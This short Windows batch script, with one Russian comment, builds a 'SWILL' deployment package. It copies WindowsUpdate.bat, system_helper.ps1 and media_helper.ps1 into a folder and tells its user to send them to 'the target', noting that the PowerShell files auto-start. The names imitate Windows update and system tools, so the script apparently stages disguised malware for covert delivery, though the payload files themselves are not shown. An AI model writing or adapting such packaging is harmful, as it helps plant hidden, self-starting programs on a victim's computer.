@echo off
title SWILL Deployment
echo [SWILL] Preparing deployment package...

:: Создание папки с файлами
mkdir SWILL_Package
copy WindowsUpdate.bat SWILL_Package\
copy system_helper.ps1 SWILL_Package\
copy media_helper.ps1 SWILL_Package\

echo [SWILL] Package created in SWILL_Package folder
echo [SWILL] Send these files to the target:
echo   1. WindowsUpdate.bat
echo   2. system_helper.ps1 (auto-starts)
echo   3. media_helper.ps1 (auto-starts)
pause